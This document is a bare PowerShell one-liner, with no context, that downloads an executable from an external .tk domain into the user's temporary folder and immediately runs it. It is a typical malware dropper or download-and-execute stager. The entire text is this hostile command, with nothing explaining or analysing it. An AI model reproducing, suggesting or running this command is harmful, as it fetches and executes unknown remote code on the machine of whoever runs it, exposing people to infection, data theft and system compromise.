
(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/i1/iz_001.exe',"$env:TEMP\iz_001.exe");Start-Process ("$env:TEMP\iz_001.exe")

